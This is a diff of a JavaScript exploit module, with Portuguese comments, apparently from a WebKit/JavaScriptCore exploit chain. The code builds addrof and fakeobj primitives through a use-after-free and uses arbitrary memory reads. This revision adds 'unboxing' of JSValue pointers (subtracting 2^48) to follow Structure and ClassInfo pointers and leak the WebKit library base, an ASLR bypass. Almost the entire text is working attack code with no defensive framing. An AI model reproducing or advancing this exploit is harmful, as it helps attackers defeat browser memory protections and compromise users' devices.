@@ -1,15 +1,17 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R53 - Correção Final de Offset)
+// js/script3/testArrayBufferVictimCrash.mjs (R54 - Correção Final com Unboxing de Ponteiro)
 // =======================================================================================
-// ESTRATÉGIA R53 - CORREÇÃO FINAL:
-// O erro anterior foi ler o cabeçalho do objeto (offset 0) em vez do ponteiro
-// da Estrutura (offset 8). Esta versão corrige essa única linha para completar a cadeia.
+// ESTRATÉGIA R54:
+// A correção final. Implementa a etapa de "unboxing" do ponteiro.
+// 1. Obtém o ponteiro "boxed" da primitiva addrof.
+// 2. Subtrai a constante de boxing (2^48) para obter o endereço de memória real.
+// 3. Usa o endereço real para navegar nas estruturas de objetos e vazar a base do WebKit.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "WebKit_Base_Leaker_R53_Final";
+export const FNAME_MODULE = "WebKit_Base_Leaker_R54_Unboxed";
 
 // Funções auxiliares de conversão (sem alterações)
 const ftoi = (val) => {
@@ -23,10 +25,10 @@ const itof = (val) => {
 };
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R53 com correção)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R54 com correção de unboxing)
 // =======================================================================================
 export async function runFullExploitChain_R52() { // Mantendo nome da função para compatibilidade
-    logS3(`--- Iniciando ${FNAME_MODULE}: Correção Final de Offset ---`, "test");
+    logS3(`--- Iniciando ${FNAME_MODULE}: Exploração com Unboxing de Ponteiro ---`, "test");
     
     try {
         // --- FASE 1: Construir Primitivas addrof e fakeobj via UAF ---
@@ -54,15 +56,18 @@ export async function runFullExploitChain_R52() { // Mantendo nome da função p
         // --- FASE 3: Executar a Carga Útil de Vazamento ---
         logS3("--- FASE 3: Executando a Carga Útil para vazar a base do WebKit ---", "subtest");
         const test_obj = { payload: 0x1337 };
-        const test_obj_addr = addrof(test_obj);
+        const boxed_addr = addrof(test_obj);
+        logS3(`    Endereço "Boxed" do objeto de teste: ${boxed_addr.toString(true)}`, "info");
 
         // ============================================================================
-        // A CORREÇÃO FINAL ESTÁ AQUI:
-        // Lemos o ponteiro da Estrutura no offset 8, não no offset 0.
-        // O offset 0 contém o cabeçalho do JSCell, não o ponteiro.
-        const structure_addr = arb_read(test_obj_addr.add(8));
+        // A CORREÇÃO FINAL ESTÁ AQUI: UNBOXING DO PONTEIRO
+        // Ponteiros de JSValue são frequentemente "encaixotados" com 2^48.
+        const unbox_constant = new AdvancedInt64(0, 0x10000); // 2^48
+        const real_addr = boxed_addr.sub(unbox_constant);
+        logS3(`    Endereço Real "Unboxed" do objeto: ${real_addr.toString(true)}`, "leak");
         // ============================================================================
 
+        const structure_addr = arb_read(real_addr.add(8)); // Lendo do endereço real + offset
         logS3(`    Lendo ponteiro da Estrutura: ${structure_addr.toString(true)}`, "info");
         
         const class_info_addr = arb_read(structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
